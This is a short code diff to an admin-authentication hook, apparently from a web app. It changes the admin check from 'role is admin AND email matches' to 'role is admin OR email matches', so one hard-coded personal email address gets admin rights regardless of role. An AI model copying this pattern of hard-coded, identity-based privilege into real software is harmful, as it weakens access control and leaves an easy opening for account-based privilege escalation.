@@ -40,7 +40,7 @@ export function useAdminAuth() {
       }
 
       const isAdmin =
-        userWithProfile.profile?.role === "admin" &&
+        userWithProfile.profile?.role === "admin" ||
         userWithProfile.user.email === "aravindhofficiallinks@gmail.com";
       setState({
         user: userWithProfile.user,
